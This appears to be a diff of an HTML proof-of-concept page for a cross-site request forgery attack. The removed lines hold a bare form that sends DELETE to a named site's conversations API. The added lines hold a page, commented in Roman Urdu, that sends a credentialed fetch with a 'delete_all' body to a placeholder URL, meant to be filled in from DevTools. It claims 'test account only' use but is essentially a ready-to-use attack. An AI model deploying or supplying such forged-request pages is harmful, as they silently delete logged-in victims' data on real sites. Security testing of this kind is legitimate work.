@@ -1,7 +1,47 @@
-<html>
-	<body>
-		<form method="DELETE" action="https://hey.bild.de/api/conversations">
-			<input type="submit" value="Submit">
-		</form>
-	</body>
+<!doctype html>
+<html lang="ur">
+<head>
+  <meta charset="utf-8">
+  <title>PoC — Delete Chats (Test Only)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+</head>
+<body>
+  <h2>PoC — Chat History Delete (Sirf Test Account)</h2>
+  <p>Instructions: apne browser mein site pe login karo, phir yahan <em>Run</em> dabao. Sirf apne test account par try karo.</p>
+
+  <button id="run">Run (Test Account)</button>
+
+  <script>
+    // IMPORTANT: sirf apne test account par chalana.
+    // Replace karo ye values with wohi values jo DevTools mein real request mein dikh rahi thi.
+    const TARGET_URL = 'https://target.example.com/path/to/delete'; // <- replace karo
+    const METHOD = 'POST'; // ya 'DELETE' — jo real request use karta hai
+    const BODY = 'action=delete_all'; // form-encoded body ya jo site expect karti ho
+
+    document.getElementById('run').addEventListener('click', async () => {
+      if (!confirm('Kya aap sach mein test account par ye action chalana chahte hain?')) return;
+
+      try {
+        const resp = await fetch(TARGET_URL, {
+          method: METHOD,
+          credentials: 'include',           // cookies bhejne ke liye zaroori
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded' // agar site form expect karti ho
+            // agar real request mein koi aur header chahiye ho to yahan add karo
+            // 'X-Requested-With': 'XMLHttpRequest'
+          },
+          body: BODY
+        });
+
+        const text = await resp.text();
+        console.log('STATUS:', resp.status, resp.statusText);
+        console.log('RESPONSE BODY:', text);
+        alert('Request bhej di — console mein response dekho.');
+      } catch (err) {
+        console.error(err);
+        alert('Request failed — console dekho.');
+      }
+    });
+  </script>
+</body>
 </html>
